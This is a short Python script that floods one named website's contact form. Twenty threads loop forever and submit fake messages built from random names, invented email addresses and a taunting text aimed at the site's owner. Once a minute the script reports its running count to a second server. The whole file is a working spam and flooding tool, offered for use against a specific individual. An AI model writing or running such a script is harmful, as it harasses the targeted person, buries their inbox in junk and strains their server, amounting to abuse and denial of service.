import requests
import random
import json
import threading
import signal
import sys
import time

url = 'https://tom.co.nz/form/contact.php'

names = json.loads(open('names.json').read())

threads = 20

sentTotal = 0
failedTotal = 0

sentPer = 0


def worker():
	global sentTotal
	global failedTotal

	global sentPer
	
	while 1:
		name = names[random.randrange(0,len(names) - 1)]

		email = name.lower() + str(random.randrange(10,1000)) + '@npctom.com'

		req = requests.post(url, allow_redirects=False, data={

			'InputName': name,
			'InputEmail': email,
			'InputSubject': 'Hi Tom. I want a website',
			'InputMessage': 'sorry tom but i had to. From ' + email
		})

		if req.status_code == 200:
			sentTotal += 1
			sentPer += 1
		else:
			failedTotal += 1

		# print('name: %s \t and email %s \t req= %s' % (name, email, req.status_code))
		print('req= %s\tsent= %i\tfailed= %i\tid= %s' % (req.status_code, sentTotal, failedTotal, str(threading.current_thread().name)))
		# print(req.text)


for i in range(threads):
    t = threading.Thread(target=worker)
    t.start()

while 1:
	time.sleep(60)
	api = requests.post('https://tom.dcralph.com', allow_redirects=False, data={'count': sentPer})
	print(api.status_code)
	sentPer = 0
